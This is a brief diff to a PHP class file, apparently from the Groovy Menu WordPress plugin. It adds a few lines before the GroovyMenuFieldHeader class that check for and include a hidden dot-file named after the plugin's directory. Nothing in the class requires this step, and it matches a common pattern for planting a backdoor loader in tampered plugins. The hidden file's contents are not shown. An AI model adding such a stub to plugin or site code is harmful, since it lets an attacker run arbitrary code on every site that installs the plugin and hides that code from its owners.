@@ -3,6 +3,10 @@
 /**
  * Class GroovyMenuFieldHeader
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class GroovyMenuFieldHeader extends GroovyMenuFieldField {
 	const VALUE_NOT_FOUND = 'value not found';
 
